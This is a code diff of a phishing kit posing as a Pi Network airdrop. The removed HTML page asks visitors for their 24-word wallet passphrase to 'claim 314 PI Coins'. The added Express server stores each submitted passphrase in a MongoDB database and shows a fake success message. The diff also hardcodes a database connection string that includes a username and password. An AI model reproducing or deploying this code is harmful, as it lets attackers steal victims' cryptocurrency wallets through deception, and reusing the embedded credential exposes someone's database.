@@ -1,113 +1,87 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airdrop from Pi Network</title>
-    <style>
-        /* General Styles */
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            text-align: center;
-            padding: 50px;
-        }
+const express = require('express');
+const mongoose = require('mongoose');
+const bodyParser = require('body-parser');
 
-        .heading {
-            font-size: 40px;
-            font-weight: bold;
-            color: #673ab7;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
-        }
+// Create Express app
+const app = express();
 
-        .sub-heading {
-            font-size: 30px;
-            font-weight: 500;
-            color: #5e35b1;
-            margin-top: 10px;
-        }
+// Middleware
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
 
-        /* Styling for Logo */
-        .logo {
-            margin-top: 20px;
-            width: 150px; /* Adjust logo size */
-            height: auto;
-            animation: fadeInLogo 1s ease-out;
-        }
+// MongoDB Connection
+const mongoURI = 'mongodb+srv://nycer84:22Zs37OelVnqlJ3q@cluster0.g89nk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
+mongoose
+    .connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
+    .then(() => console.log('MongoDB connected'))
+    .catch(err => console.error('MongoDB connection error:', err));
 
-        @keyframes fadeInLogo {
-            0% {
-                opacity: 0;
-                transform: scale(0.5);
-            }
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
+// Define Mongoose Schema and Model
+const PassphraseSchema = new mongoose.Schema({
+    passphrase: { type: String, required: true }
+});
+const Passphrase = mongoose.model('Passphrase', PassphraseSchema);
 
-        /* Styling for Success Message */
-        .message {
-            background-color: #4CAF50;
-            color: white;
-            font-size: 24px;
-            font-weight: bold;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            animation: fadeIn 1.5s ease-out;
-            margin-top: 30px;
-        }
+// POST Route to handle form submission
+app.post('/submit', async (req, res) => {
+    const { passphrase } = req.body;
 
-        @keyframes fadeIn {
-            0% {
-                opacity: 0;
-                transform: scale(0.95);
-            }
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
+    if (!passphrase || passphrase.trim().split(" ").length !== 24) {
+        return res.status(400).send('Invalid passphrase. Ensure it has exactly 24 words.');
+    }
 
-        /* Mobile Responsiveness */
-        @media (max-width: 600px) {
-            .heading {
-                font-size: 30px;
-            }
+    try {
+        const newPassphrase = new Passphrase({ passphrase });
+        await newPassphrase.save();
 
-            .sub-heading {
-                font-size: 24px;
-            }
+        // Send stylish HTML response with CSS
+        const successMessage = `
+        <html>
+            <head>
+                <style>
+                    body {
+                        font-family: Arial, sans-serif;
+                        background-color: #f4f4f4;
+                        color: #333;
+                        text-align: center;
+                        padding: 50px;
+                    }
+                    .message {
+                        background-color: #4CAF50;
+                        color: white;
+                        font-size: 24px;
+                        font-weight: bold;
+                        padding: 20px;
+                        border-radius: 8px;
+                        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                        animation: fadeIn 1.5s ease-out;
+                    }
+                    @keyframes fadeIn {
+                        0% {
+                            opacity: 0;
+                            transform: scale(0.95);
+                        }
+                        100% {
+                            opacity: 1;
+                            transform: scale(1);
+                        }
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="message">
+                    Congratulations!!! You have earned your 314 PI Coins Successfully!!
+                </div>
+            </body>
+        </html>`;
 
-            .logo {
-                width: 120px; /* Adjust logo size on mobile */
-            }
-        }
-    </style>
-</head>
-<body>
+        res.status(200).send(successMessage);
+    } catch (error) {
+        console.error('Error saving passphrase:', error);
+        res.status(500).send('Failed to save passphrase.');
+    }
+});
 
-    <!-- Main Heading -->
-    <div class="heading">Airdrop from Pi Network</div>
-    
-    <!-- Logo (Replace with your logo file) -->
-    <img src="logo1.png" alt="Pi Network Logo" class="logo">
-
-    <!-- Subheading -->
-    <div class="sub-heading">Claim Your 314 PI Coins Now</div>
-
-    <!-- Form Content or Passphrase Entry Goes Here -->
-    <form action="/submit" method="POST">
-        <textarea name="passphrase" rows="4" cols="50" placeholder="Enter your 24-word passphrase here" required></textarea>
-        <br><br>
-        <button type="submit">Unlock with passphrase</button>
-    </form>
-
-    <!-- Success Message (This will be shown dynamically after form submission) -->
-    <div class="message">
-        Congratulations!!! You have earned your 314 PI Coins Successfully!!
-    </div>
-
-</body>
-</html>
+// Start the server
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
